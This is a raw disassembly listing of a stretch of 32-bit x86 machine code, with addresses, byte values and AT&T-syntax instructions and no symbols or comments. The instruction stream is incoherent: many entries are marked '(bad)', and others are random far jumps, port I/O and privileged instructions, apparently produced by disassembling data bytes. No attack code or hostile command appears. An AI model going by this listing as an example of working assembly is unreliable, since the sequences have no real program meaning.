  404ce1:	b7 07                	mov    $0x7,%bh
  404ce3:	26 5f                	es pop %edi
  404ce5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404ce6:	18 af 82 4f 5b 63    	sbb    %ch,0x635b4f82(%edi)
  404cec:	19 f2                	sbb    %esi,%edx
  404cee:	0d e2 65 06 ce       	or     $0xce0665e2,%eax
  404cf3:	6b c9 7e             	imul   $0x7e,%ecx,%ecx
  404cf6:	97                   	xchg   %eax,%edi
  404cf7:	95                   	xchg   %eax,%ebp
  404cf8:	19 d6                	sbb    %edx,%esi
  404cfa:	07                   	pop    %es
  404cfb:	f2 4c                	repnz dec %esp
  404cfd:	9c                   	pushf
  404cfe:	ff 20                	jmp    *(%eax)
  404d00:	ba 0d 9c b7 92       	mov    $0x92b79c0d,%edx
  404d05:	7e 1e                	jle    0x404d25
  404d07:	d9 7b 88             	fnstcw -0x78(%ebx)
  404d0a:	35 c0 79 35 d0       	xor    $0xd03579c0,%eax
  404d0f:	13 27                	adc    (%edi),%esp
  404d11:	ea 56 64 fd 8c 3b 90 	ljmp   $0x903b,$0x8cfd6456
  404d18:	df 45 72             	filds  0x72(%ebp)
  404d1b:	bb 88 ec 0f c3       	mov    $0xc30fec88,%ebx
  404d20:	ef                   	out    %eax,(%dx)
  404d21:	46                   	inc    %esi
  404d22:	be 4f 7d f2 31       	mov    $0x31f27d4f,%esi
  404d27:	8d 9d ac f9 c0 04    	lea    0x4c0f9ac(%ebp),%ebx
  404d2d:	5d                   	pop    %ebp
  404d2e:	de f5                	fdivp  %st,%st(5)
  404d30:	1f                   	pop    %ds
  404d31:	1b 4f 40             	sbb    0x40(%edi),%ecx
  404d34:	be 67 e2 dc 4a       	mov    $0x4adce267,%esi
  404d39:	f6 e7                	mul    %bh
  404d3b:	ec                   	in     (%dx),%al
  404d3c:	84 60 e9             	test   %ah,-0x17(%eax)
  404d3f:	56                   	push   %esi
  404d40:	76 35                	jbe    0x404d77
  404d42:	72 bd                	jb     0x404d01
  404d44:	f9                   	stc
  404d45:	6a 52                	push   $0x52
  404d47:	78 b4                	js     0x404cfd
  404d49:	7b d8                	jnp    0x404d23
  404d4b:	dd 3c 0b             	fnstsw (%ebx,%ecx,1)
  404d4e:	85 73 8e             	test   %esi,-0x72(%ebx)
  404d51:	99                   	cltd
  404d52:	f3 19 52 fa          	repz sbb %edx,-0x6(%edx)
  404d56:	88 6b 80             	mov    %ch,-0x80(%ebx)
  404d59:	33 40 34             	xor    0x34(%eax),%eax
  404d5c:	52                   	push   %edx
  404d5d:	e9 7b 54 73 a6       	jmp    0xa6b3a1dd
  404d62:	81 f3 6b 13 e7 26    	xor    $0x26e7136b,%ebx
  404d68:	aa                   	stos   %al,%es:(%edi)
  404d69:	59                   	pop    %ecx
  404d6a:	87 ba 19 be c7 36    	xchg   %edi,0x36c7be19(%edx)
  404d70:	55                   	push   %ebp
  404d71:	36 f0 0d 13 9c 11 32 	ss lock or $0x32119c13,%eax
  404d78:	3f                   	aas
  404d79:	eb 61                	jmp    0x404ddc
  404d7b:	8c b0 55 78 8b b3    	mov    %?,-0x4c7487ab(%eax)
  404d81:	c6                   	(bad)
  404d82:	d0 73 09             	shlb   $1,0x9(%ebx)
  404d85:	2f                   	das
  404d86:	39 f1                	cmp    %esi,%ecx
  404d88:	20 be e9 79 84 37    	and    %bh,0x378479e9(%esi)
  404d8e:	37                   	aaa
  404d8f:	31 1a                	xor    %ebx,(%edx)
  404d91:	3d 9f f0 ce 65       	cmp    $0x65cef09f,%eax
  404d96:	07                   	pop    %es
  404d97:	f1                   	int1
  404d98:	0d f0 04 e1 5d       	or     $0x5de104f0,%eax
  404d9d:	82 7b 2e 03          	cmpb   $0x3,0x2e(%ebx)
  404da1:	9c                   	pushf
  404da2:	2a bc f1 ac 83 f8 d6 	sub    -0x29077c54(%ecx,%esi,8),%bh
  404da9:	78 b6                	js     0x404d61
  404dab:	f0 3e c8 8a 46 ef    	lock ds enter $0x468a,$0xef
  404db1:	22 e1                	and    %cl,%ah
  404db3:	15 66 3c 65 30       	adc    $0x30653c66,%eax
  404db8:	c1 01 e1             	roll   $0xe1,(%ecx)
  404dbb:	95                   	xchg   %eax,%ebp
  404dbc:	67 3c 87             	addr16 cmp $0x87,%al
  404dbf:	de 0d aa 17 ff 8b    	fimuls 0x8bff17aa
  404dc5:	24 16                	and    $0x16,%al
  404dc7:	fc                   	cld
  404dc8:	d3 8d 4f 46 1e 6d    	rorl   %cl,0x6d1e464f(%ebp)
  404dce:	7b c9                	jnp    0x404d99
  404dd0:	a0 79 8f c7 bb       	mov    0xbbc78f79,%al
  404dd5:	75 65                	jne    0x404e3c
  404dd7:	2f                   	das
  404dd8:	c4 6f d2             	les    -0x2e(%edi),%ebp
  404ddb:	79 3c                	jns    0x404e19
  404ddd:	4e                   	dec    %esi
  404dde:	4b                   	dec    %ebx
  404ddf:	d0 e3                	shl    $1,%bl
  404de1:	71 6a                	jno    0x404e4d
  404de3:	1e                   	push   %ds
  404de4:	8f                   	(bad)
  404de5:	33 24 e8             	xor    (%eax,%ebp,8),%esp
  404de8:	f1                   	int1
  404de9:	38 35 ef 84 d4 83    	cmp    %dh,0x83d484ef
  404def:	fc                   	cld
  404df0:	4f                   	dec    %edi
  404df1:	8d 08                	lea    (%eax),%ecx
  404df3:	ef                   	out    %eax,(%dx)
  404df4:	f4                   	hlt
  404df5:	d4 68                	aam    $0x68
  404df7:	9d                   	popf
  404df8:	d7                   	xlat   %ds:(%ebx)
  404df9:	80 65 61 41          	andb   $0x41,0x61(%ebp)
  404dfd:	cf                   	iret
  404dfe:	9d                   	popf
  404dff:	ca f7 94             	lret   $0x94f7
  404e02:	b7 ea                	mov    $0xea,%bh
  404e04:	e2 0c                	loop   0x404e12
  404e06:	87 7b c8             	xchg   %edi,-0x38(%ebx)
  404e09:	bb 04 36 65 be       	mov    $0xbe653604,%ebx
  404e0e:	62 08                	bound  %ecx,(%eax)
  404e10:	87 17                	xchg   %edx,(%edi)
  404e12:	84 57 8e             	test   %dl,-0x72(%edi)
  404e15:	5e                   	pop    %esi
  404e16:	24 fc                	and    $0xfc,%al
  404e18:	5d                   	pop    %ebp
  404e19:	78 7f                	js     0x404e9a
  404e1b:	ca 7a cb             	lret   $0xcb7a
  404e1e:	30 03                	xor    %al,(%ebx)
  404e20:	f2 33 54 cf 9d       	repnz xor -0x63(%edi,%ecx,8),%edx
  404e25:	f9                   	stc
  404e26:	01 7a 77             	add    %edi,0x77(%edx)
  404e29:	0b af 1e 3d 2b cc    	or     -0x33d4c2e2(%edi),%ebp
  404e2f:	ca d4 da             	lret   $0xdad4
  404e32:	b4 c1                	mov    $0xc1,%ah
  404e34:	fc                   	cld
  404e35:	4c                   	dec    %esp
  404e36:	39 2a                	cmp    %ebp,(%edx)
  404e38:	07                   	pop    %es
  404e39:	d1 5b 94             	rcrl   $1,-0x6c(%ebx)
  404e3c:	29 47 25             	sub    %eax,0x25(%edi)
  404e3f:	1a bd 95 c2 7b 34    	sbb    0x347bc295(%ebp),%bh
  404e45:	b3 4b                	mov    $0x4b,%bl
  404e47:	99                   	cltd
  404e48:	09 15 c2 7b 3a d3    	or     %edx,0xd33a7bc2
  404e4e:	04 33                	add    $0x33,%al
  404e50:	a1 4e 78 99 21       	mov    0x2199784e,%eax
  404e55:	87 20                	xchg   %esp,(%eax)
  404e57:	16                   	push   %ss
  404e58:	36 08 2f             	or     %ch,%ss:(%edi)
  404e5b:	3f                   	aas
  404e5c:	24 16                	and    $0x16,%al
  404e5e:	bd f6 e0 15 3e       	mov    $0x3e15e0f6,%ebp
  404e63:	35 c4 41 20 53       	xor    $0x532041c4,%eax
  404e68:	bd 7a 83 29 96       	mov    $0x9629837a,%ebp
  404e6d:	c5 c3 fd             	(bad)
  404e70:	e4 ed                	in     $0xed,%al
  404e72:	87 f7                	xchg   %esi,%edi
  404e74:	13 bf 34 24 40 55    	adc    0x55402434(%edi),%edi
  404e7a:	96                   	xchg   %eax,%esi
  404e7b:	ea fd c3 1c ce 92 e0 	ljmp   $0xe092,$0xce1cc3fd
  404e82:	32 e1                	xor    %cl,%ah
  404e84:	7d 49                	jge    0x404ecf
  404e86:	de 07                	fiadds (%edi)
  404e88:	c2 fb 53             	ret    $0x53fb
  404e8b:	5c                   	pop    %esp
  404e8c:	2c 7a                	sub    $0x7a,%al
  404e8e:	0d b3 d4 56 ae       	or     $0xae56d4b3,%eax
  404e93:	60                   	pusha
  404e94:	e1 2c                	loope  0x404ec2
  404e96:	19 1e                	sbb    %ebx,(%esi)
  404e98:	99                   	cltd
  404e99:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404e9a:	e5 90                	in     $0x90,%eax
  404e9c:	0c 4f                	or     $0x4f,%al
  404e9e:	8b b2 f1 e8 ef 0c    	mov    0xcefe8f1(%edx),%esi
  404ea4:	f8                   	clc
  404ea5:	9a 3f 5b f5 0e 26 1b 	lcall  $0x1b26,$0xef55b3f
  404eac:	8d 29                	lea    (%ecx),%ebp
  404eae:	50                   	push   %eax
  404eaf:	33 5b ab             	xor    -0x55(%ebx),%ebx
  404eb2:	99                   	cltd
  404eb3:	0a cd                	or     %ch,%cl
  404eb5:	a2 ec dc 8c 70       	mov    %al,0x708cdcec
  404eba:	96                   	xchg   %eax,%esi
  404ebb:	0a 5b 85             	or     -0x7b(%ebx),%bl
  404ebe:	f7 69 34             	imull  0x34(%ecx)
  404ec1:	f7 ce 16 de c9 b3    	test   $0xb3c9de16,%esi
  404ec7:	b6 a2                	mov    $0xa2,%dh
  404ec9:	f7 c0 84 f3 c6 c8    	test   $0xc8c6f384,%eax
  404ecf:	db 1f                	fistpl (%edi)
  404ed1:	7f 6e                	jg     0x404f41
  404ed3:	12 2f                	adc    (%edi),%ch
  404ed5:	e3 ff                	jecxz  0x404ed6
  404ed7:	05 e0 92 f4 b7       	add    $0xb7f492e0,%eax
  404edc:	63 c3                	arpl   %eax,%ebx
  404ede:	8d 9a 17 91 16 63    	lea    0x63169117(%edx),%ebx
  404ee4:	cc                   	int3
  404ee5:	10 de                	adc    %bl,%dh
  404ee7:	85 e9                	test   %ebp,%ecx
  404ee9:	c7                   	(bad)
  404eea:	cc                   	int3
  404eeb:	b2 1b                	mov    $0x1b,%dl
  404eed:	33 83 65 27 59 53    	xor    0x53592765(%ebx),%eax
  404ef3:	8c b3 82 de 5e 6b    	mov    %?,0x6b5ede82(%ebx)
  404ef9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404efa:	71 0e                	jno    0x404f0a
  404efc:	fc                   	cld
  404efd:	5e                   	pop    %esi
  404efe:	77 85                	ja     0x404e85
  404f00:	6c                   	insb   (%dx),%es:(%edi)
  404f01:	78 55                	js     0x404f58
  404f03:	5c                   	pop    %esp
  404f04:	fd                   	std
  404f05:	95                   	xchg   %eax,%ebp
  404f06:	b4 6c                	mov    $0x6c,%ah
  404f08:	63 36                	arpl   %esi,(%esi)
  404f0a:	2c 9a                	sub    $0x9a,%al
  404f0c:	a3 7a ef a7 e5       	mov    %eax,0xe5a7ef7a
  404f11:	1b 73 e0             	sbb    -0x20(%ebx),%esi
  404f14:	9c                   	pushf
  404f15:	39 b2 66 89 71 3e    	cmp    %esi,0x3e718966(%edx)
  404f1b:	5c                   	pop    %esp
  404f1c:	19 f4                	sbb    %esi,%esp
  404f1e:	56                   	push   %esi
  404f1f:	19 17                	sbb    %edx,(%edi)
  404f21:	c0 53 41 af          	rclb   $0xaf,0x41(%ebx)
  404f25:	c6                   	(bad)
  404f26:	58                   	pop    %eax
  404f27:	00 9f 91 f7 5e 28    	add    %bl,0x285ef791(%edi)
  404f2d:	9f                   	lahf
  404f2e:	83 8b e1 1b e1 f1 39 	orl    $0x39,-0xe1ee41f(%ebx)
  404f35:	b8 18 8c 73 55       	mov    $0x55738c18,%eax
  404f3a:	8f                   	(bad)
  404f3b:	cf                   	iret
  404f3c:	dd 62 88             	frstor -0x78(%edx)
  404f3f:	10 1e                	adc    %bl,(%esi)
  404f41:	9f                   	lahf
  404f42:	bb c5 10 2b 3c       	mov    $0x3c2b10c5,%ebx
  404f47:	3e e7 97             	ds out %eax,$0x97
  404f4a:	40                   	inc    %eax
  404f4b:	8a f0                	mov    %al,%dh
  404f4d:	f8                   	clc
  404f4e:	9c                   	pushf
  404f4f:	5f                   	pop    %edi
  404f50:	02 73 84             	add    -0x7c(%ebx),%dh
  404f53:	c7                   	(bad)
  404f54:	ef                   	out    %eax,(%dx)
  404f55:	8e 12                	mov    (%edx),%ss
  404f57:	c8 13 1e 9f          	enter  $0x1e13,$0x9f
  404f5b:	c9                   	leave
  404f5c:	25 50 2c 3c 3e       	and    $0x3e3c2c50,%eax
  404f61:	93                   	xchg   %eax,%ebx
  404f62:	4b                   	dec    %ebx
  404f63:	60                   	pusha
  404f64:	b5 f0                	mov    $0xf0,%ch
  404f66:	f8                   	clc
  404f67:	4c                   	dec    %esp
  404f68:	5e                   	pop    %esi
  404f69:	0a 6b 85             	or     -0x7b(%ebx),%ch
  404f6c:	c7                   	(bad)
  404f6d:	67 f2 52             	addr16 repnz push %edx
  404f70:	68 98 ab ce 90       	push   $0x90ceab98
  404f75:	40                   	inc    %eax
  404f76:	7c 8b                	jl     0x404f03
  404f78:	71 19                	jno    0x404f93
  404f7a:	b4 0a                	mov    $0xa,%ah
  404f7c:	ef                   	out    %eax,(%dx)
  404f7d:	bc f8 4d e8 b9       	mov    $0xb9e84df8,%esp
  404f82:	84 c7                	test   %al,%bh
  404f84:	ef                   	out    %eax,(%dx)
  404f85:	e2 e5                	loop   0x404f6c
  404f87:	e0 11                	loopne 0x404f9a
  404f89:	1e                   	push   %ds
  404f8a:	bf 8b 97 83 4f       	mov    $0x4f83978b,%edi
  404f8f:	78 df                	js     0x404f70
  404f91:	c6                   	(bad)
  404f92:	76 29                	jbe    0x404fbd
  404f94:	2b e0                	sub    %eax,%esp
  404f96:	04 e1                	add    $0xe1,%al
  404f98:	85 c4                	test   %eax,%esp
  404f9a:	99                   	cltd
  404f9b:	f0 7d fb             	lock jge 0x404f99
  404f9e:	54                   	push   %esp
  404f9f:	e1 95                	loope  0x404f36
  404fa1:	db 9d c6 95 70 b6    	fistpl -0x498f6a3a(%ebp)
  404fa7:	f0 1a ed             	lock sbb %ch,%ch
  404faa:	1e                   	push   %ds
  404fab:	f4                   	hlt
  404fac:	2e 12 de             	cs adc %dh,%bl
  404faf:	2e fb                	cs sti
  404fb1:	41                   	inc    %ecx
  404fb2:	58                   	pop    %eax
  404fb3:	05 07 84 37 64       	add    $0x64378407,%eax
  404fb8:	8f 46 ef             	pop    -0x11(%esi)
  404fbb:	06                   	push   %es
  404fbc:	e1 5d                	loope  0x40501b
  404fbe:	97                   	xchg   %eax,%edi
  404fbf:	78 08                	js     0x404fc9
  404fc1:	56                   	push   %esi
  404fc2:	c3                   	ret
  404fc3:	ad                   	lods   %ds:(%esi),%eax
  404fc4:	c2 bb 27             	ret    $0x27bb
  404fc7:	31 16                	xor    %edx,(%esi)
  404fc9:	bd 7b 85 d7 94       	mov    $0x94d7857b,%ebp
  404fce:	72 08                	jb     0x404fd8
  404fd0:	4a                   	dec    %edx
  404fd1:	e1 11                	loope  0x404fe4
  404fd3:	e1 b5                	loope  0x404f8a
  404fd5:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404fd6:	c4 a2 f7 d4 5c 6d    	les    0x6d5cd4f7(%edx),%esp
  404fdc:	c4 1c f0             	les    (%eax,%esi,8),%ebx
  404fdf:	4a                   	dec    %edx
  404fe0:	d0 f3                	shl    $1,%bl
  404fe2:	1b 1d 10 91 ad f5    	sbb    0xf5ad9110,%ebx
  404fe8:	7c 25                	jl     0x40500f
  404fea:	cc                   	int3
  404feb:	cc                   	int3
  404fec:	d6                   	salc
  404fed:	7a be                	jp     0x404fad
  404fef:	12 52 b2             	adc    -0x4e(%edx),%dl
  404ff2:	b5 9e                	mov    $0x9e,%ch
  404ff4:	5f                   	pop    %edi
  404ff5:	0b b3 b3 b5 9e 5f    	or     0x5f9eb5b3(%ebx),%esi
  404ffb:	0b 79 d9             	or     -0x27(%ecx),%edi
  404ffe:	5a                   	pop    %edx
  404fff:	cf                   	iret
  405000:	57                   	push   %edi
  405001:	41                   	inc    %ecx
  405002:	71 b6                	jno    0x404fba
  405004:	d6                   	salc
  405005:	f3 55                	repz push %ebp
  405007:	b0 3a                	mov    $0x3a,%al
  405009:	5b                   	pop    %ebx
  40500a:	eb f9                	jmp    0x405005
  40500c:	6a 58                	push   $0x58
  40500e:	9b                   	fwait
  40500f:	ad                   	lods   %ds:(%esi),%eax
  405010:	f5                   	cmc
  405011:	7c 35                	jl     0x405048
  405013:	d4 67                	aam    $0x67
  405015:	6b 3d 5f 0d ad d9 5a 	imul   $0x5a,0xd9ad0d5f,%edi
  40501c:	cf                   	iret
  40501d:	1f                   	pop    %ds
  40501e:	05 ce 6c ad e7       	add    $0xe7ad6cce,%eax
  405023:	8f 02                	pop    (%edx)
  405025:	4f                   	dec    %edi
  405026:	b6 9a                	mov    $0x9a,%dh
  405028:	43                   	inc    %ebx
  405029:	5e                   	pop    %esi
  40502a:	c2 45 c6             	ret    $0xc645
  40502d:	75 70                	jne    0x40509f
  40502f:	bc f0 2a 13 ae       	mov    $0xae132af0,%esp
  405034:	45                   	inc    %ebp
  405035:	ef                   	out    %eax,(%dx)
  405036:	04 e1                	add    $0xe1,%al
  405038:	3d 0f 77 18 6b       	cmp    $0x6b18770f,%eax
  40503d:	e0 14                	loopne 0x405053
  40503f:	e1 bd                	loope  0x404ffe
  405041:	03 0f                	add    (%edi),%ecx
  405043:	a3 77 b6 f0 be       	mov    %eax,0xbef0b677
  405048:	86 a7 8d b5 70 a1    	xchg   %ah,-0x5e8f4a73(%edi)
  40504e:	f0 a2 d9 1f d1 3b    	lock mov %al,0x3bd11fd9
  405054:	90                   	nop
  405055:	2d 73 7f cb 58       	sub    $0x58cb7f73,%eax
  40505a:	07                   	pop    %es
  40505b:	63 ba dc d7 c3 33    	arpl   %edi,0x33c3d7dc(%edx)
  405061:	ba dc d7 c3 4b       	mov    $0x4bc3d7dc,%edx
  405066:	ba dc 1b e1 35       	mov    $0x35e11bdc,%edx
  40506b:	5d                   	pop    %ebp
  40506c:	ee                   	out    %al,(%dx)
  40506d:	8d                   	lea    (bad),%esi
  40506e:	f0 b6 2e             	lock mov $0x2e,%dh
  405071:	f7 26                	mull   (%esi)
  405073:	f8                   	clc
  405074:	50                   	push   %eax
  405075:	97                   	xchg   %eax,%edi
  405076:	7b 13                	jnp    0x40508b
  405078:	fc                   	cld
  405079:	4b                   	dec    %ebx
  40507a:	97                   	xchg   %eax,%edi
  40507b:	7b 33                	jnp    0x4050b0
  40507d:	7c ab                	jl     0x40502a
  40507f:	cb                   	lret
  405080:	bd 19 8c f3 b4       	mov    $0xb4f38c19,%ebp
  405085:	dc 9b 21 72 9e 96    	fcompl -0x69618ddf(%ebx)
  40508b:	7b 0b                	jnp    0x405098
  40508d:	c4                   	(bad)
  40508e:	ce                   	into
  40508f:	d3 72 6f             	shll   %cl,0x6f(%edx)
  405092:	81 d4 79 6a d4 df    	adc    $0xdfd46a79,%esp
  405098:	44                   	inc    %esp
  405099:	1f                   	pop    %ds
  40509a:	84 0d 30 47 78 a1    	test   %cl,0xa1784730
  4050a0:	d6                   	salc
  4050a1:	68 f4 16 ce d3       	push   $0xd3ce16f4
  4050a6:	ee                   	out    %al,(%dx)
  4050a7:	aa                   	stos   %al,%es:(%edi)
  4050a8:	8d b0 2a e8 6d 82    	lea    -0x7d9217d6(%eax),%esi
  4050ae:	56                   	push   %esi
  4050af:	68 99 a7 65 d4       	push   $0xd465a799
  4050b4:	06                   	push   %es
  4050b5:	c7                   	(bad)
  4050b6:	ce                   	into
  4050b7:	d3 32                	shll   %cl,(%edx)
  4050b9:	6a 83                	push   $0xffffff83
  4050bb:	ae                   	scas   %es:(%edi),%al
  4050bc:	79 5a                	jns    0x405118
  4050be:	46                   	inc    %esi
  4050bf:	9b                   	fwait
  4050c0:	a0 77 9e 96 d1       	mov    0xd1969e77,%al
  4050c5:	26 d8 39             	fdivrs %es:(%ecx)
  4050c8:	4f                   	dec    %edi
  4050c9:	cb                   	lret
  4050ca:	e8 68 38 79 9e       	call   0x9eb98937
  4050cf:	96                   	xchg   %eax,%esi
  4050d0:	d1 d1                	rcl    $1,%ecx
  4050d2:	70 e6                	jo     0x4050ba
  4050d4:	3c 2d                	cmp    $0x2d,%al
  4050d6:	a3 63 60 df 3c       	mov    %eax,0x3cdf6063
  4050db:	2d a3 63 e0 32       	sub    $0x32e063a3,%eax
  4050e0:	5d                   	pop    %ebp
  4050e1:	46                   	inc    %esi
  4050e2:	c7 c0 88 2e a3 63    	mov    $0x63a32e88,%eax
  4050e8:	e1 26                	loope  0x405110
  4050ea:	5d                   	pop    %ebp
  4050eb:	46                   	inc    %esi
  4050ec:	c7 c2 9d 22 87 1b    	mov    $0x1b87229d,%edx
  4050f2:	67 75 29             	addr16 jne 0x40511e
  4050f5:	c7 c1 83 c2 bb 6b    	mov    $0x6bbbc283,%ecx
  4050fb:	96                   	xchg   %eax,%esi
  4050fc:	09 8e 83 c7 84 77    	or     %ecx,0x7784c783(%esi)
  405102:	6a 56                	push   $0x56
  405104:	97                   	xchg   %eax,%edi
  405105:	d2 0e                	rorb   %cl,(%esi)
  405107:	cf                   	iret
  405108:	0a ef                	or     %bh,%ch
  40510a:	dc 2c 13             	fsubrl (%ebx,%edx,1)
  40510d:	b4 c3                	mov    $0xc3,%ah
  40510f:	21 e1                	and    %esp,%ecx
  405111:	1d b0 b9 c1 09       	sbb    $0x9c1b9b0,%eax
  405116:	6f                   	outsl  %ds:(%esi),(%dx)
  405117:	08 ef                	or     %ch,%bh
  405119:	d7                   	xlat   %ds:(%ebx)
  40511a:	b6 4d                	mov    $0x4d,%dh
  40511c:	e8 bd 2b bc 65       	call   0x65fc7cde
  405121:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405122:	2e c5 05 1f 09 af c2 	lds    %cs:0xc2af091f,%eax
  405129:	64 02 17             	add    %fs:(%edi),%dl
  40512c:	7c 11                	jl     0x40513f
  40512e:	ec                   	in     (%dx),%al
  40512f:	17                   	pop    %ss
  405130:	06                   	push   %es
  405131:	9b                   	fwait
  405132:	d5 3f                	aad    $0x3f
  405134:	b2 48                	mov    $0x48,%dl
  405136:	de 7b c6             	fidivrs -0x3a(%ebx)
  405139:	cd 50                	int    $0x50
  40513b:	14 f4                	adc    $0xf4,%al
  40513d:	3e 36 76 41          	ds jbe,pt 0x405182
  405141:	5f                   	pop    %edi
  405142:	8e d6                	mov    %esi,%ss
  405144:	67 dd b0 2b 47       	fnsave 0x472b(%bx,%si)
  405149:	eb b3                	jmp    0x4050fe
  40514b:	6e                   	outsb  %ds:(%esi),(%dx)
  40514c:	18 ca                	sbb    %cl,%dl
  40514e:	d1 fa                	sar    $1,%edx
  405150:	ac                   	lods   %ds:(%esi),%al
  405151:	07                   	pop    %es
  405152:	f6 e6                	mul    %dh
  405154:	68 7d d6 03 17       	push   $0x1703d67d
  405159:	e4 68                	in     $0x68,%al
  40515b:	7d d6                	jge    0x405133
  40515d:	0b 57 e4             	or     -0x1c(%edi),%edx
  405160:	68 7d d6 0b d7       	push   $0xd70bd67d
  405165:	e5 68                	in     $0x68,%eax
  405167:	7d e6                	jge    0x40514f
  405169:	85 9b 73 b4 3e f3    	test   %ebx,-0xcc14b8d(%ebx)
  40516f:	c2 5d 39             	ret    $0x395d
  405172:	5a                   	pop    %edx
  405173:	9f                   	lahf
  405174:	79 e1                	jns    0x405157
  405176:	e1 1c                	loope  0x405194
  405178:	ad                   	lods   %ds:(%esi),%eax
  405179:	cf                   	iret
  40517a:	fa                   	cli
  40517b:	e0 f1                	loopne 0x40516e
  40517d:	1c ad                	sbb    $0xad,%al
  40517f:	cf                   	iret
  405180:	fa                   	cli
  405181:	e0 f7                	loopne 0x40517a
  405183:	6a 9c                	push   $0xffffff9c
  405185:	21 4a cc             	and    %ecx,-0x34(%edx)
  405188:	41                   	inc    %ecx
  405189:	38 1e                	cmp    %bl,(%esi)
  40518b:	5e                   	pop    %esi
  40518c:	16                   	push   %ss
  40518d:	5e                   	pop    %esi
  40518e:	54                   	push   %esp
  40518f:	4c                   	dec    %esp
  405190:	34 7a                	xor    $0x7a,%al
  405192:	6f                   	outsl  %ds:(%esi),(%dx)
  405193:	ca 32 5c             	lret   $0x5c32
  405196:	27                   	daa
  405197:	7c f0                	jl     0x405189
  405199:	9e                   	sahf
  40519a:	2c c3                	sub    $0xc3,%al
  40519c:	75 c2                	jne    0x405160
  40519e:	07                   	pop    %es
  40519f:	9f                   	lahf
  4051a0:	08 ef                	or     %ch,%bh
  4051a2:	43                   	inc    %ebx
  4051a3:	3c cf                	cmp    $0xcf,%al
  4051a5:	0f 5f 0a             	maxps  (%edx),%xmm1
  4051a8:	ef                   	out    %eax,(%dx)
  4051a9:	4b                   	dec    %ebx
  4051aa:	3c cf                	cmp    $0xcf,%al
  4051ac:	0f f4 07             	pmuludq (%edi),%mm0
  4051af:	ab                   	stos   %eax,%es:(%edi)
  4051b0:	d1 73 e2             	shll   $1,-0x1e(%ebx)
  4051b3:	79 fd                	jns    0x4051b2
  4051b5:	10 22                	adc    %ah,(%edx)
  4051b7:	bc 6e 3c af 1f       	mov    $0x1faf3c6e,%esp
  4051bc:	ac                   	lods   %ds:(%esi),%al
  4051bd:	c2 bb c5             	ret    $0xc5bb
  4051c0:	72 08                	jb     0x4051ca
  4051c2:	06                   	push   %es
  4051c3:	20 41 78             	and    %al,0x78(%ecx)
  4051c6:	0f 5a 62 d1          	cvtps2pd -0x2f(%edx),%xmm4
  4051ca:	cb                   	lret
  4051cb:	cc                   	int3
  4051cc:	95                   	xchg   %eax,%ebp
  4051cd:	7d f6                	jge    0x4051c5
  4051cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4051d0:	e3 0e                	jecxz  0x4051e0
  4051d2:	58                   	pop    %eax
  4051d3:	1a f4                	sbb    %ah,%dh
  4051d5:	8e 18                	mov    (%eax),%ds
  4051d7:	77 c2                	ja     0x40519b
  4051d9:	71 b9                	jno    0x405194
  4051db:	5a                   	pop    %edx
  4051dc:	0f 9e 00             	setle  (%eax)
  4051df:	5d                   	pop    %ebp
  4051e0:	b9 5a 0f 9e 00       	mov    $0x9e0f5a,%ecx
  4051e5:	de 5c ad 07          	ficomps 0x7(%ebp,%ebp,4)
  4051e9:	4f                   	dec    %edi
  4051ea:	84 9d b9 5a 0f 9e    	test   %bl,-0x61f0a547(%ebp)
  4051f0:	08 81 5c ad 07 f7    	or     %al,-0x8f852a4(%ecx)
  4051f6:	c0 99 b9 5a 0f ee 81 	rcrb   $0x81,-0x11f0a547(%ecx)
  4051fd:	fd                   	std
  4051fe:	b9 5a 0f 0e c2       	mov    $0xc20e0f5a,%ecx
  405203:	e5 b9                	in     $0xb9,%eax
  405205:	5a                   	pop    %edx
  405206:	0f 0e                	femms
  405208:	c2 48 ae             	ret    $0xae48
  40520b:	d6                   	salc
  40520c:	83 83 70 30 57 eb c1 	addl   $0xffffffc1,-0x14a8cf90(%ebx)
  405213:	93                   	xchg   %eax,%ebx
  405214:	e0 ce                	loopne 0x4051e4
  405216:	5c                   	pop    %esp
  405217:	ad                   	lods   %ds:(%esi),%eax
  405218:	07                   	pop    %es
  405219:	4f                   	dec    %edi
  40521a:	82 87 44 0e 7c 35 3d 	addb   $0x3d,0x357c0e44(%edi)
  405221:	19 1e                	sbb    %ebx,(%esi)
  405223:	13 1e                	adc    (%esi),%ebx
  405225:	5f                   	pop    %edi
  405226:	4d                   	dec    %ebp
  405227:	4f                   	dec    %edi
  405228:	86 e7                	xchg   %ah,%bh
  40522a:	84 37                	test   %dh,(%edi)
  40522c:	27                   	daa
  40522d:	d5 6a                	aad    $0x6a
  40522f:	0a c0                	or     %al,%al
  405231:	21 e1                	and    %esp,%ecx
  405233:	2d 4a fd b7 31       	sub    $0x31b7fd4a,%eax
  405238:	00 7f 16             	add    %bh,0x16(%edi)
  40523b:	5e                   	pop    %esi
  40523c:	76 8a                	jbe    0x4051c8
  40523e:	dd 34 04             	fnsave (%esp,%eax,1)
  405241:	ef                   	out    %eax,(%dx)
  405242:	0a 6f 69             	or     0x69(%edi),%ch
  405245:	ca 1c f4             	lret   $0xf41c
  405248:	3e 0e                	ds push %cs
  40524a:	e6 ce                	out    %al,$0xce
  40524c:	e0 14                	loopne 0x405262
  40524e:	f8                   	clc
  40524f:	4e                   	dec    %esi
  405250:	97                   	xchg   %eax,%edi
  405251:	fb                   	sti
  405252:	29 60 9a             	sub    %esp,-0x66(%eax)
  405255:	af                   	scas   %es:(%edi),%eax
  405256:	e5 7e                	in     $0x7e,%eax
  405258:	0a 44 cd d7          	or     -0x29(%ebp,%ecx,8),%al
  40525c:	72 3f                	jb     0x40529d
  40525e:	15 e2 e6 6b b9       	adc    $0xb96be6e2,%eax
  405263:	9f                   	lahf
  405264:	0a 69 f3             	or     -0xd(%ecx),%ch
  405267:	b5 dc                	mov    $0xdc,%ch
  405269:	4f                   	dec    %edi
  40526a:	83 b9 f3 b5 dc 4f 83 	cmpl   $0xffffff83,0x4fdcb5f3(%ecx)
  405271:	fc                   	cld
  405272:	f9                   	stc
  405273:	5a                   	pop    %edx
  405274:	ee                   	out    %al,(%dx)
  405275:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405276:	43                   	inc    %ebx
  405277:	c9                   	leave
  405278:	7c 2d                	jl     0x4052a7
  40527a:	f7 d3                	not    %ebx
  40527c:	a1 74 be 96 fb       	mov    0xfb96be74,%eax
